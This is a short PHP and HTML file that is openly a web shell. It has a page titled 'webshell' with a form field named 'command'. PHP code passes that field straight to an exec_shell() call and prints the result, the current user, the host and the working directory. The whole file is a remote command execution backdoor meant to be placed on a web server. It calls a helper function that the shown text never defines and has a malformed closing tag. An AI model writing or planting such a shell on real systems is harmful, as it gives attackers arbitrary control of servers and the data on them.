<html>
<h1>webshell</h1>
<form id="webshell" action="">
	<input id="command" type="text" value="" name="command"/>
	<input id="button" type="submit" value="Submit"/>
</form>
</html
<?php
	echo "<hr><br>";
	echo exec_shell('whoami') . "@" . $HTTP_SERVER_VARS['HTTP_HOST'] . "[" . exec_shell('pwd') . "]$ ";
	echo $_GET['command'] . ": " . exec_shell($_GET['command']) . "</br>";
?>
